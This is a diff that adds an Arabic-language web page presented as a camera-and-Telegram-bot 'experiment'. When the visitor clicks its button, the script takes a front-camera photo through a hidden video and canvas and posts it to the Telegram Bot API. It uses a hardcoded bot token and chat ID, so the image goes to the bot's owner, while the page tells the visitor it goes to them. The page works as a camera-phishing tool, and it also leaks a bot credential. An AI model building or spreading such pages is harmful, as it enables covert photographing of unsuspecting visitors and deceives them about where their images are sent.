@@ -1,0 +1,75 @@
+here<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تجربة التقاط الصور</title>
+</head>
+<body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f9;">
+
+    <h2 style="color: #333;">تجربة الكاميرا والبوت</h2>
+    <p style="color: #666;">اضغط على الزر، واقبل إذن الكاميرا لتصلك الصورة على تليجرام</p>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <button id="captureBtn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #24292e; color: white; border: none; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        ابدأ التجربة الآن
+    </button>
+
+    <script>
+        // بياناتك التي قدمتها
+        const token = '7819904584:AAExsLo2jFP3KkuJuepaw_SiFV9ME_ZI_vw';
+        const chatId = '7837239112';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btn = document.getElementById('captureBtn');
+
+        btn.addEventListener('click', async () => {
+            try {
+                // طلب الوصول للكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                btn.innerText = "جاري الاتصال بالكاميرا...";
+                btn.style.backgroundColor = "#ffc107";
+
+                // انتظار ثانية واحدة لالتقاط صورة واضحة
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويل الصورة وإرسالها
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'image.jpg');
+                        formData.append('caption', '✅ تم التقاط صورة بنجاح من الرابط!');
+
+                        btn.innerText = "جاري إرسال الصورة...";
+
+                        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            alert("نجحت التجربة! تفقد رسائل البوت في تليجرام.");
+                        } else {
+                            alert("حدث خطأ في الإرسال، تأكد من تشغيل البوت أولاً.");
+                        }
+                        
+                        // إيقاف الكاميرا لتوفير الطاقة والخصوصية
+                        stream.getTracks().forEach(track => track.stop());
+                        btn.innerText = "إعادة التجربة";
+                        btn.style.backgroundColor = "#28a745";
+                    }, 'image/jpeg');
+                }, 1500);
+
+            } catch (err) {
+                console.error(err);
+                alert("يجب السماح بالوصول للكاميرا لكي تنجح التجربة.");
+            }
+        });
+    </script>
+</body>
+</html>
